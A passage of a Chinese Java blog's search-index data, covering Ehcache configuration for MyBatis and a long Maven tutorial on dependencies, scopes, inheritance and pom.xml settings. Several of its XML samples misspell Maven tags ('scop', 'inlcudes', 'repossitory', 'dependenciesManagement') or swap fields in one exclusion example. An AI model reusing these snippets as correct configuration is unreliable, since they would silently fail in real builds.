添加ehcache.xml文件，ehcache配置文件，具体配置自行百度 点击查看配置文件 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ehcache xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:noNamespaceSchemaLocation=&quot;http://ehcache.org/ehcache.xsd&quot; updateCheck=&quot;false&quot;&gt; &lt;!--diskStore：为缓存路径，ehcache分为内存和磁盘两级，此属性定义磁盘的缓存位置。参数解释如下：user.home – 用户主目录user.dir – 用户当前工作目录java.io.tmpdir – 默认临时文件路径--&gt; &lt;diskStore path=&quot;./tmpdir/Tmp_EhCache&quot;/&gt; &lt;defaultCache eternal=&quot;false&quot; maxElementsInMemory=&quot;10000&quot; overflowToDisk=&quot;false&quot; diskPersistent=&quot;false&quot; timeToIdleSeconds=&quot;1800&quot; timeToLiveSeconds=&quot;259200&quot; memoryStoreEvictionPolicy=&quot;LRU&quot;/&gt;&lt;/ehcache&gt;&lt;!--name:缓存名称。maxElementsInMemory：缓存最大个数。eternal:对象是否永久有效，一但设置了，timeout将不起作用。timeToIdleSeconds：设置对象在失效前的允许闲置时间（单位：秒）。仅当eternal=false对象不是永久有效时使用，可选属性，默认值是0，也就是可闲置时间无穷大。timeToLiveSeconds：设置对象在失效前允许存活时间（单位：秒）。最大时间介于创建时间和失效时间之间。仅当eternal=false对象不是永久有效时使用，默认是0.，也就是对象存活时间无穷大。overflowToDisk：当内存中对象数量达到maxElementsInMemory时，Ehcache将会对象写到磁盘中。diskSpoolBufferSizeMB：这个参数设置DiskStore（磁盘缓存）的缓存区大小。默认是30MB。每个Cache都应该有自己的一个缓冲区。maxElementsOnDisk：硬盘最大缓存个数。diskPersistent：是否在磁盘上持久化。指重启jvm后，数据是否有效。默认为false。memoryStoreEvictionPolicy：当达到maxElementsInMemory限制时，Ehcache将会根据指定的策略去清理内存。默认策略是LRU（最近最少使用）。你可以设置为FIFO（先进先出）或是LFU（较少使用）。clearOnFlush：内存数量最大时是否清除。--&gt; 测试 12345678[com.ender.dao.UserMapper.findUserById]-==&gt; Preparing: selectid,username,password from user where id = ?[com.ender.dao.UserMapper.findUserById]-==&gt; Parameters: 1(Integer)[com.ender.dao.UserMapper.findUserById]-&lt;== Total: 1User&#123;id=1, username=&#x27;ender&#x27;, password=&#x27;123456&#x27;&#125;[com.ender.dao.UserMapper]-Cache Hit Ratio [com.ender.dao.UserMapper]: 0.5User&#123;id=1, username=&#x27;ender&#x27;, password=&#x27;123456&#x27;&#125;true 其实我们更加常见的是使用第三方的缓存进行存储，并且自由控制 12345&lt;dependency&gt; &lt;groupId&gt;net.sf.ehcache&lt;/groupId&gt; &lt;artifactId&gt;ehcache&lt;/artifactId&gt; &lt;version&gt;2.10.3&lt;/version&gt;&lt;/dependency&gt; 1234567891011121314final CacheManager cacheManager = newCacheManager(this.getClass().getClassLoader().getResourceAsStream(&quot;ehcache.xml&quot;));// create the cache called &quot;hello-world&quot;String[] cacheNames = cacheManager.getCacheNames();for (String cacheName : cacheNames) &#123; System.out.println(cacheName);&#125;Cache userDao = cacheManager.getCache(&quot;userDao&quot;);Element element = new Element(&quot;testFindUserById_1&quot;,new User(1,&quot;q&quot;,&quot;d&quot;));userDao.put(element);Element element1 = userDao.get(&quot;testFindUserById_1&quot;);User user = (User)element1.getObjectValue();System.out.println(user); 参考笔记 IT楠老师https://www.itnanls.cn/","categories":[{"name":"ssm","slug":"ssm","permalink":"http://enderxiao.github.io/categories/ssm/"},{"name":"mybatis","slug":"ssm/mybatis","permalink":"http://enderxiao.github.io/categories/ssm/mybatis/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://enderxiao.github.io/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://enderxiao.github.io/tags/Spring/"},{"name":"mybatis","slug":"mybatis","permalink":"http://enderxiao.github.io/tags/mybatis/"}]},{"title":"javaMaven","slug":"javaMaven","date":"2021-01-31T07:56:12.000Z","updated":"2024-07-30T11:26:33.917Z","comments":true,"path":"2021/01/31/javaMaven/","permalink":"http://enderxiao.github.io/2021/01/31/javaMaven/","excerpt":"java工具——包管理工具Maven","text":"java工具——包管理工具Maven Maven 优点 统一管理jar包，自动导入jar及其以来依赖 项目移植之后甚至不需要安装并发工具，只需要maven加命令就能跑，降低学习成本 使得项目流水线成为可能，因为使用简单的命令我们就能完成项目的编译，打包，发布等工作，就让程序操作程序成为了可能，大名鼎鼎的jekins也能做到这一点 Maven下载安装 Maven官网 下载binary文件 Maven安装 解压 配置MAVEN_HOME，为maven的解压 配置path，%MAVEN_HOME%\\bin 使用如下命令验证是否配置成功 1mvn -v Maven核心全局配置文件 1\\apache-maven-3.6.3\\conf\\settings.xml 配置路径 选择一个位置新建文件夹repository，setting.xml中添加如下标记 1&lt;localRepository&gt;D:\\program\\Maven\\repository&lt;/localRepository&gt; 配置国内镜像 123456&lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;&lt;/mirror&gt; 配置全局编译jdk版本 当计算机中有多个版本的jdk时，以下配置是必须的 123456789101112&lt;profile&gt; &lt;id&gt;jdk-11.0.9&lt;/id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;jdk&gt;11&lt;/jdk&gt; &lt;/activation&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt; &lt;maven.compiler.compilerVersion&gt;11&lt;/maven.compiler.compilerVersion&gt; &lt;/properties&gt;&lt;/profile&gt; Maven体验 Maven标准目录 1234567891011src |--main |--java 源代码目录 |--resources 资源目录 |--test |--java 测试代码目录 |--resources 测试资源目录 |--target |--ckasses 编译后的class文件目录 |--test-classes 编译后的测试class文件目录pom.xml Maven工程配置文件 pom.xml基本内容 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;!-- 模型版本 --&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt; &lt;groupId&gt;com.companyname.project-group&lt;/groupId&gt; &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt; &lt;artifactId&gt;project&lt;/artifactId&gt; &lt;!-- 版本号 --&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/project&gt; 在创建好上述项目结构并配置好maven以及项目pom后，在项目根目录使用如下命令就能利用maven，进行自动的依赖下载，以及项目编译: 1mvn compile Maven生命周期 maven生命周期描述了一个项目从源代码到部署的整个周期 Maven有三个内置的生命周期： 清理（clean）：为执行一下工作做必要的清理，如删除target文件夹 默认（default）：真正进行项目编译打包工作的阶段 站点（site）：生成项目报告，站点，发布站点 默认生命周期包括以下阶段（该阶段经过简化，实际上更加复杂）： 验证（validate）：验证项目是否正确，所有必要信息是否可用 编译（compile）：编译项目的源代码 测试（test）：使用合适的单元测试框架测试编译的源代码。这些测试不应该要求代码被打包或部署 打包（package）：采用编译的代码，并以其可分配格式（如JAR）进行打包 验证（verify）：对集成测试的结果执行任何检查，以确保满足质量标砖 安装（install）：将软件包安装到本地存储中，用作本地其他项目的依赖项 部署（deploy）：在构建环境中完成，将最终的包复制到远程存储以与其他开发人员和项目共享（私服） Maven的版本规范 所有软件都有版本 Maven使用如下几个要素来定位一个项目，因此它们又称为项目的坐标。 groupId：团体、组织的标识符。团体标识的约定量，它以创建这个项目的组织名称的,逆向域名开头。一般对应着JAVA的包的结构，例如org.apache。 artifactId：单独项目的唯一标识符。比如tomcat，commons等。不要再其中使用. version：项目版本 packaging：项目的类型，默认是jar，描述了项目打包后的输出，类型为jar的项目产生一个JAR文件，类型为war的项目产生一个web应用。 Maven在版本管理时可以使用几个特殊的字符串 SNAPSHOT，LARESR，RELEASE。比如“1.0-SNAPSHOT”。各个部分的含义和处理逻辑如下说明： SNAPSHOT 这个版本一般用于开发过程中，表示不稳定版 LARESR 指某个特定构件的最新发布，这个发布可能是一个发布版，也可能是一个snapshot版，具体看那个时间最后 RELEASE 指最后一个发布版 Idea配置Maven 为当前项目配置 File →\\to→ Settings →\\to→ 搜索Maven →\\to→ Maven home path、User settings file、Local repository 三项分别设置为： Maven安装路径 conf/settings.xml的路径 repository文件夹的路径 为未来项目配置 New Project Settings →\\to→ Settings for New Projects… →\\to→ 搜索Maven →\\to→ Maven home path、User settings file、Local repository 配置同上 Maven依赖 Maven管理依赖也就是jar包不用我们自己下载，会从一些地方自动下载 maven远程仓库https://mvnrepository.com/ maven远程仓库https://maven.aliyun.com/mvn/search Maven 工程中我们依赖在pom.xml文件进行配置完成jar包管理工作（依赖） 在工程中引入某个jar包，只需要在pom.xml中引入jar包的坐标，比如引入log4j的依赖 12345678&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.7&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; Maven通过groupId、artifactId与version三个向量来定位Maven仓库其jar包所在的位置，并把对应的jar包引入到工程中来 依赖范围 classpath 编译好的class文件所在的路径 事实上，类加载器（classloader）就是去对应的classpath中加载class二进制文件 maven项目 maven工程会将src/main/java和src/main/recources文件夹下的文件全部打包在classpath中。运行时它们两个文件夹下的文件会被放在一个文件夹下。 maven项目不同的阶段引入到classpath中的依赖是不同的例如 编译时，maven会将与编译相关的依赖引入classpath中 测试时，maven会将与测试相关的依赖引入classpath中 运行时，maven会将与运行相关的依赖引入classpath中 而依赖范围就是用来控制依赖于这三种classpath的关系 scop标签 scop标签就是依赖范围的配置 该项默认配置为compile，可选配置还有test、provide、runtime、system、import 其中compile、test和provided使用较多 部分jar包指在某一特定时候需要被加载，例如： servlet-api，运行时其实是不需要的，因为tomcat里有，但编译时需要，因为编译时没有tomcat环境 junit，只有在测试的时候才能用到，运行时不需要 JDBC，测试时必须要有，编译时不需要，编译时用的都是jdk中的接口，运行时我们才使用反射注册驱动 编译依赖范围（compile） 该范围是默认范围，次依赖范围对于编译、测试、运行三种classpath都有效如 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.68&lt;/version&gt;&lt;/dependency&gt; 测试依赖范围（test） 指对测试classpath有效，编译运行时都无法使用依赖，如junit 123456&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.7&lt;/version&gt; &lt;scop&gt;test&lt;/scop&gt;&lt;/dependency&gt; 已提供依赖范围（provided） 支队编译和测试的classpath有效，对运行的classpath无效，如servlet-api，如果不设置依赖范围，当容器依赖的版本和maven依赖的版本不一致时会引起冲突 123456&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;scop&gt;provided&lt;/scop&gt;&lt;/dependency&gt; 运行时依赖范围（runtime） 只对测试和运行的classpath有效，对编译的classpath无效，如JDBC驱动 123456&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connection-java&lt;/artifactId&gt; &lt;version&gt;5.1.25&lt;/version&gt; &lt;scop&gt;runtime&lt;/scop&gt;&lt;/dependency&gt; 依赖传递 jar包也是别人写的工程项目，她们也会依赖其他的jar包，传递性让我们可以不用关心我们所依赖的jar包依赖了哪些jar，只要我们添加了依赖，他会自动将所依赖的jar统统依赖进来 依赖传递原则 最短路径优先原则：如果A依赖了B，B依赖了C，在B和C 中同时依赖了log4j的依赖，并且这两个版本不一致，那么A会根据最短路径原则，在A中会传递过来B的log4j版本 路径相同先声明原则：如果我们的工程同时依赖于B和A，B和C没有依赖关系，并且都有D的依赖，且版本不一致，那么会引入在pom.xml中先声明依赖的log4j版本。 12345678910&lt;dependency&gt; &lt;groupId&gt;com.ender&lt;/groupId&gt; &lt;artifactId&gt;B&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.ender&lt;/groupId&gt; &lt;artifactId&gt;A&lt;/artifactId&gt; &lt;version&gt;1.5&lt;/version&gt;&lt;/dependency&gt; 因为D的1.2.3版本的依赖关系优先得到确定，所以依赖D的1.2.3，因此如果A包中使用了D1.3.2的某些新特性，可能造成A包无法使用的问题，于是就需要把低版本排除，一般高版本会兼容低版本 依赖的排除 对于上例中，我们如果想把低版本的D包排除，就可以做如下设置 1234567891011121314151617181920&lt;dependency&gt; &lt;groupId&gt;com.ender&lt;/groupId&gt; &lt;artifactId&gt;B&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;com.ender&lt;/artifactId&gt; &lt;groupId&gt;D&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.ender&lt;/groupId&gt; &lt;artifactId&gt;A&lt;/artifactId&gt; &lt;version&gt;1.5&lt;/version&gt;&lt;/dependency&gt; 聚合和继承 分布式项目必须使用到该功能 **聚合模块（父模块）**的打包方式必须时pom，否则无法完成构建 在聚合多个项目时，如果这些聚合的项目中需要引入相同的jar，那么可以将这些jar写入父pom中，各个子项目集成该pom即可。父模块的打包方式必须为pom，否则无法构建项目 通过修改pom.xml来表明继承关系： 父模块pom： 12345678910111213141516171819202122232425262728293031&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;maven-test&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;!-- 子模块--&gt; &lt;modules&gt; &lt;module&gt;child-one&lt;/module&gt; &lt;/modules&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt; &lt;/properties&gt;&lt;!-- 打包方式--&gt; &lt;packaging&gt;pom&lt;/packaging&gt;&lt;!-- 依赖--&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-lang&lt;/groupId&gt; &lt;artifactId&gt;commons-lang&lt;/artifactId&gt; &lt;version&gt;2.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 子模块POM： 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;&lt;!-- 依赖关系--&gt; &lt;parent&gt; &lt;artifactId&gt;maven-test&lt;/artifactId&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;child-one&lt;/artifactId&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt; &lt;/properties&gt;&lt;/project&gt; 可被继承的POM元素如下： groupId:项目子ID，项目坐标的核心元素 version:项目版本，项目坐标的核心元素 properties：自定义的Maven属性，一般用于统一制定各个依赖的版本好 dependencies dependencyManagement：项目依赖管理配置 repositories build：包括项目的源码目录配置、输出目录配置、插件配置、插件管理配置等 实现父子工程统一版本管理 对于一个父子嵌套的工程，当我们要对所有子工程进行统一管理时，常常需要所有子工程使用统一的插件版本，我们可能会使用 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-lang&lt;/groupId&gt; &lt;artifactId&gt;commons-lang&lt;/artifactId&gt; &lt;version&gt;2.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 这样的方式在父工程的pom中配置，但是这样在打包时，子工程无论用没用到这个插件，都会将其打包进该工程中，因此我们需要使用别的方法进行版本管理： 首先在父工程的pom中配置： 123456789101112131415&lt;!-- 定义常量进行统一版本管理 --&gt;&lt;properties&gt; &lt;fastjson-version&gt;1.2.68&lt;/fastjson-version&gt;&lt;/properties&gt;&lt;!-- 此处引用的插件在子工程中服务立马生效，只有当子工程声明使用该插件时才能生效 --&gt;&lt;dependenciesManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;$&#123;fastjson-version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependenciesManagement&gt; 子工程pom中配置： 1234567&lt;!-- 子工程中声明时不需要声明版本号，将自动从父工程中的插件里得到版本号 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; POM文件 基础配置 一个典型的pom.xml文件配置如下： 点击查看配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;!-- 模型版本 --&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt; &lt;groupId&gt;com.companyname.project-group&lt;/groupId&gt; &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt; &lt;artifactId&gt;project&lt;/artifactId&gt; &lt;!-- 版本号 --&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;!-- 打包机制,如pom、jar、war，默认为jar--&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;!-- 为pom定义一些商量，在pom中的其他地方可以直接引用 使用方式如下：$&#123;file.encoding&#125; --&gt; &lt;!-- 常用来整体控制一些依赖的版本号 --&gt; &lt;properties&gt; &lt;file.encoding&gt;UTF-8&lt;/file.encoding&gt; &lt;java.source.version&gt;1.8&lt;/java.source.version&gt; &lt;java.target.version&gt;1.8&lt;/java.target.version&gt; &lt;/properties&gt; &lt;!-- 定义本项目的依赖关系，就是依赖的jar包 --&gt; &lt;dependencies&gt; &lt;!-- 每个dependency都对应一个jar包 --&gt; &lt;dependency&gt; &lt;!-- 一般情况下，maven是通过groupId、artifactId、version三个元素指（俗称坐标）来检索该构件，然后引入你的工程。如果别人想引用你现在开发的这个目录（前提是已开发完毕并发布到了远程仓库） --&gt; &lt;!-- 就需要在她的pom文件中新建一个dependency节点，将本项目的groupId、artifactId、version写入，maven就会把你上传的jar包下载到她的本地 --&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;!-- 依赖范围 --&gt; &lt;scop&gt;compile&lt;/scop&gt; &lt;!-- 设置 依赖是否可选，默认为false，即子项目默认都继承，如果为true，则子项目必须显式的引入 --&gt; &lt;optional&gt;false&lt;/optional&gt; &lt;!-- 排除依赖 --&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;commons-lang&lt;/groupId&gt; &lt;artifactId&gt;commons-lang&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 一般来说，上面的几个配置项对任何项目都是必不可少的，定义了项目的基本属性 构建配置 点击查看配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;build&gt; &lt;!-- 产生的构建的文件名，默认值为$&#123;artifactId&#125;-$&#123;version&#125; --&gt; &lt;finalName&gt;myProjectName&lt;/finalName&gt; &lt;!-- 构建产生的所有文件存放发目录，默认为$&#123;basedir&#125;/target,即项目根目录下的target --&gt; &lt;directory&gt;$&#123;basedir&#125;/target&lt;/directory&gt; &lt;!-- 项目相关的所有资源路径列表，例如和项目相关的配置文件、属性文件，这些资源被包含在最终的打包文件里 --&gt; &lt;!-- 项目源码目录，当构建项目的时候，构建系统会编译目录里的源码，该路径是相对于pom.xml的相对路径 --&gt; &lt;sourceDirectory&gt;$&#123;basedir&#125;\\src\\main\\java&lt;/sourceDirectory&gt; &lt;!-- 项目单元测试使用的源码目录，当测试项目的时候，构建系统会编译目录里的源码，该路径是相对于pom.xml的相对路径 --&gt; &lt;testSourceDirectory&gt;$&#123;basedir&#125;\\src\\test\\java&lt;/testSourceDirectory&gt; &lt;!-- 被编译过的应用程序class文件存放的目录 --&gt; &lt;outputDirectory&gt;$&#123;basedir&#125;\\target\\classes&lt;/outputDirectory&gt; &lt;!-- 被编译过的测试class文件存放的目录 --&gt; &lt;testOutputDirectory&gt;$&#123;basedir&#125;\\target\\test-classes&lt;/testOutputDirectory&gt; &lt;!-- 以上配置遵循约定大于配置原则，一般使用默认配置 --&gt; &lt;!-- 自行定义资源目录 --&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;inlcudes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/inlcudes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;inlcudes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/inlcudes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;!-- 单元测试相关的所有资源路径，配置方法于resources类似 --&gt; &lt;testResources&gt; &lt;testResource&gt; &lt;targetPath /&gt; &lt;filtering /&gt; &lt;directory /&gt; &lt;includes /&gt; &lt;excludes /&gt; &lt;/testResource&gt; &lt;/testResources&gt; &lt;!-- 使用的插件列表 --&gt; &lt;plugins&gt; &lt;plugin&gt; ...具体在插件使用中了解 &lt;/plugin&gt; &lt;/plugins&gt; &lt;!-- 主要定义插件的共同元素、拓展元素集合，类似于dependencyManagement --&gt; &lt;!-- 所有继承于次项目的子项目都能使用。该插件配置项直到被引用时才会被解析或绑定到生命周期。 --&gt; &lt;!-- 给定插件的任何本地配置都会覆盖这里的配置 --&gt; &lt;pluginManagement&gt; &lt;plugins&gt;...&lt;/plugins&gt; &lt;/pluginManagement&gt;&lt;/build&gt; 常用的几个配置 处理资源被过滤的问题 1234567891011121314151617181920&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;inlcudes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/inlcudes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;inlcudes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/inlcudes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt; 添加本地jar包 1234567891011121314&lt;!-- geelynote maven的核心插件-compiler插件默认只支持编译Java1.4，因此需要加上支持高版本jre的配置，在 --&gt;&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;compilerArguments&gt; &lt;!-- 本地jar，支付宝jar包放到 src/main/webapp/WEB-INF/lib 文件夹下，如果没有配置，本地不会有问题，但线上会找不到sdk类，为什么要引入，因为支付宝jar包在中央仓库中没有，再比如oracle连接驱动的jar --&gt; &lt;extdirs&gt;$&#123;project.basedir&#125;/src/main/webapp/WEB-INF/lib&lt;/extdirs&gt; &lt;/compilerArguments&gt; &lt;/configuration&gt;&lt;/plugin&gt; 仓库配置 12345678910111213&lt;repositories&gt; &lt;repossitory&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snaphosts&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snaphosts&gt; &lt;/repossitory&gt;&lt;/repositories&gt; pom.xml中的仓库和setting.xml里的仓库功能一样，区别在于pom里配置的仓库时个性化的，比如，公司里的settings文件时公用的，若有项目都用一个settings文件，但各个子项目却会引用不同的第三方库，所以需要正在pom.xml里设置自己需要的仓库地址。 项目信息配置（了解） 点击查看配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;!--项目的名称, Maven产生的文档用 --&gt;&lt;name&gt;banseon-maven&lt;/name&gt;&lt;!--项目主页的URL, Maven产生的文档用 --&gt;&lt;url&gt;http://www.baidu.com/banseon&lt;/url&gt;&lt;!-- 项目的详细描述, Maven 产生的文档用。 当这个元素能够用HTML格式描述时（例如，CDATA中的文本会被解析器忽略，就可以包含HTML标 签）， 不鼓励使用纯文本描述。如果你需要修改产生的web站点的索引页面，你应该修改你自己的索引页文件，而不是调整这里的文档。 --&gt;&lt;description&gt;A maven project to study maven.&lt;/description&gt;&lt;!--描述了这个项目构建环境中的前提条件。 --&gt;&lt;prerequisites&gt; &lt;!--构建该项目或使用该插件所需要的Maven的最低版本 --&gt; &lt;maven /&gt;&lt;/prerequisites&gt;&lt;!--项目的问题管理系统(Bugzilla, Jira, Scarab,或任何你喜欢的问题管理系统)的名称和URL，本例为 jira --&gt;&lt;issueManagement&gt; &lt;!--问题管理系统（例如jira）的名字， --&gt; &lt;system&gt;jira&lt;/system&gt; &lt;!--该项目使用的问题管理系统的URL --&gt; &lt;url&gt;http://jira.baidu.com/banseon&lt;/url&gt;&lt;/issueManagement&gt;&lt;!--项目持续集成信息 --&gt;&lt;ciManagement&gt; &lt;!--持续集成系统的名字，例如continuum --&gt; &lt;system /&gt; &lt;!--该项目使用的持续集成系统的URL（如果持续集成系统有web接口的话）。 --&gt; &lt;url /&gt; &lt;!--构建完成时，需要通知的开发者/用户的配置项。包括被通知者信息和通知条件（错误，失败，成功，警告） --&gt; &lt;notifiers&gt; &lt;!--配置一种方式，当构建中断时，以该方式通知用户/开发者 --&gt; &lt;notifier&gt; &lt;!--传送通知的途径 --&gt; &lt;type /&gt; &lt;!--发生错误时是否通知 --&gt; &lt;sendOnError /&gt; &lt;!--构建失败时是否通知 --&gt; &lt;sendOnFailure /&gt; &lt;!--构建成功时是否通知 --&gt; &lt;sendOnSuccess /&gt; &lt;!--发生警告时是否通知 --&gt; &lt;sendOnWarning /&gt; &lt;!--不赞成使用。通知发送到哪里 --&gt; &lt;address /&gt; &lt;!--扩展配置项 --&gt; &lt;configuration /&gt; &lt;/notifier&gt; &lt;/notifiers&gt;&lt;/ciManagement&gt;&lt;!--项目创建年份，4位数字。当产生版权信息时需要使用这个值。 --&gt;&lt;inceptionYear /&gt;&lt;!--项目相关邮件列表信息 --&gt;&lt;mailingLists&gt; &lt;!--该元素描述了项目相关的所有邮件列表。自动产生的网站引用这些信息。 --&gt; &lt;mailingList&gt; &lt;!--邮件的名称 --&gt; &lt;name&gt;Demo&lt;/name&gt; &lt;!--发送邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --&gt; &lt;post&gt;banseon@126.com&lt;/post&gt; &lt;!--订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --&gt; &lt;subscribe&gt;banseon@126.com&lt;/subscribe&gt; &lt;!--取消订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 